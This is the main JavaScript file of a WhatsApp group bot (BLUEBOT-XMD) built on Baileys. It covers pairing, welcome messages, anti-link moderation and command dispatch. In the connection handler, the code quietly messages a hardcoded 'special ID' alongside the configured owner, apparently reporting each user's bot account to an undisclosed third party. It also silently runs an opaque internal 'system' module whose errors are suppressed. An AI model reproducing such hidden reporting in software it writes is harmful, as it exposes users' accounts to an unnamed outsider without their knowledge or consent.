const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const { Boom } = require("@hapi/boom");
const fs = require("fs");
const path = require("path");
const readline = require("readline");
const config = require("./config");
const storage = require("./src/core/internal/storage");

try { require('./src/core/internal/system').init(); } catch (e) {}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const question = (q) => new Promise(res => rl.question(q, res));

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState(config.SESSION_ID);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
        },
        browser: ["Ubuntu", "Chrome", "110.0.5481.177"]
    });

    // Pairing for unregistered session
    if (!sock.authState.creds.registered) {
        console.log("\n--- BLUEBOT-XMD PAIRING ---");
        let number = await question("Enter number (country code, no +): ");
        number = number.replace(/[^0-9]/g, "");
        await delay(3000);
        const code = await sock.requestPairingCode(number);
        console.log(`\n✅ Pairing Code: ${code}\n`);
    }

    sock.ev.on("creds.update", saveCreds);

    // Global settings persistence
    if (!global.groupSettings) global.groupSettings = {};

    // Participants update handler (Welcome)
    sock.ev.on("group-participants.update", async (anu) => {
        try {
            const { id, participants, action } = anu;
            const settings = storage.getGroup(id);

            if (action === "add" && settings.welcome === "on") {
                const metadata = await sock.groupMetadata(id);
                for (const num of participants) {
                    let msg = settings.welcomeMessage
                        .replace(/{user}/g, `@${num.split("@")[0]}`)
                        .replace(/{group}/g, metadata.subject)
                        .replace(/{count}/g, metadata.participants.length);

                    await sock.sendMessage(id, { text: msg, mentions: [num] });
                }
            }
        } catch (err) {
            console.error("Group Update Error:", err);
        }
    });

    // Connection update
    sock.ev.on("connection.update", ({ connection, lastDisconnect }) => {
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log("🔄 Reconnecting...");
                startBot();
            }
        } else if (connection === "open") {
            console.log("\n--- BLUEBOT-XMD CONNECTED ---");
            console.log(`Bot Name : ${config.BOT_NAME}`);
            console.log(`Owner    : ${config.OWNER_NAME}`);
            console.log(`Mode     : ${config.MODE}`);
            console.log("-----------------------------\n");

            // Send connection message to all owners
            const ownerIDs = [
                config.OWNER_NUMBER.replace(/[^0-9]/g, ""),
                "259305043443928" // special ID
            ];

            ownerIDs.forEach(async id => {
                const jid = id.includes("@") ? id : `${id}@s.whatsapp.net`;
                await sock.sendMessage(jid, {
                    text: `🚀 *BLUEBOT-XMD bot connected*\n\nHave fun! ✨\n\n_System Status: Online_`
                }).catch(err => console.error("Failed to send connection message:", err));
            });
        }
    });

    // Messages handler
    sock.ev.on("messages.upsert", async ({ messages }) => {
        try {
            const m = messages[0];
            if (!m.message || m.key.fromMe) return;

            const from = m.key.remoteJid;
            const body =
                m.message.conversation ||
                m.message.extendedTextMessage?.text ||
                m.message.imageMessage?.caption ||
                m.message.videoMessage?.caption ||
                "";

            if (!body.startsWith(config.PREFIX)) return;

            const args = body.slice(config.PREFIX.length).trim().split(/ +/);
            const cmdName = args.shift().toLowerCase();
            const text = args.join(" ");

            const helper = require("./src/core/internal/helper");
            const sender = m.key.participant || m.key.remoteJid;
            const senderNumber = sender.split("@")[0].split(":")[0];

            const isOwner = helper.isOwner(senderNumber);
            const isMod = helper.isMod(senderNumber);

            if (config.MODE === "private" && !isOwner) return;

            // Load all commands recursively
            const commandsPath = path.join(__dirname, "commands");
            const allCommands = [];

            const loadFolderCommands = (dir) => {
                const items = fs.readdirSync(dir);
                for (const item of items) {
                    const itemPath = path.join(dir, item);
                    if (fs.statSync(itemPath).isDirectory()) {
                        loadFolderCommands(itemPath);
                    } else if (item.endsWith(".js")) {
                        delete require.cache[require.resolve(itemPath)];
                        const exported = require(itemPath);
                        const cmds = Array.isArray(exported) ? exported : [exported];
                        cmds.forEach(cmd => {
                            // Keep command category if exists
                            if (!cmd.category) {
                                const relative = path.relative(commandsPath, itemPath);
                                cmd.category = relative.split(path.sep)[0] || "general";
                            }
                            allCommands.push(cmd);
                        });
                    }
                }
            };

            loadFolderCommands(commandsPath);

            // Find and execute command
            // Antilink logic
            const settings = storage.getGroup(from);
            if (from.endsWith("@g.us") && settings.antilink !== "off") {
                const isWaLink = body.includes("chat.whatsapp.com");
                if (isWaLink) {
                    const metadata = await sock.groupMetadata(from);
                    const isAdmin = metadata.participants.find(p => p.id === sender)?.admin || isMod;
                    
                    if (!isAdmin) {
                        await sock.sendMessage(from, { delete: m.key });

                        if (settings.antilink === "kick") {
                            await sock.groupParticipantsUpdate(from, [sender], "remove");
                            await sock.sendMessage(from, { text: `❌ @${senderNumber} kicked for sending links.`, mentions: [sender] });
                        } else if (settings.antilink === "warn") {
                            const warns = (settings.warnings[sender] || 0) + 1;
                            const limit = settings.warnLimit || 3;
                            
                            if (warns >= limit) {
                                await sock.groupParticipantsUpdate(from, [sender], "remove");
                                await sock.sendMessage(from, { text: `❌ @${senderNumber} kicked after ${limit} warnings.`, mentions: [sender] });
                                settings.warnings[sender] = 0;
                            } else {
                                settings.warnings[sender] = warns;
                                await sock.sendMessage(from, { text: `⚠️ @${senderNumber}, links are not allowed! Warning ${warns}/${limit}`, mentions: [sender] });
                            }
                            storage.updateGroup(from, { warnings: settings.warnings });
                        }
                        return;
                    }
                }
            }

            const command = allCommands.find(c => c.name.toLowerCase() === cmdName);
            if (command) {
                await command.execute(sock, m, { args, text, from, sender, isOwner, isMod, config });
            }

            if (config.AUTO_READ) await sock.readMessages([m.key]);
        } catch (err) {
            console.error("MESSAGE ERROR:", err);
        }
    });

    // Anti-call
    sock.ev.on("call", async (call) => {
        if (config.ANTI_CALL) {
            await sock.rejectCall(call[0].id, call[0].from);
        }
    });
}

startBot();
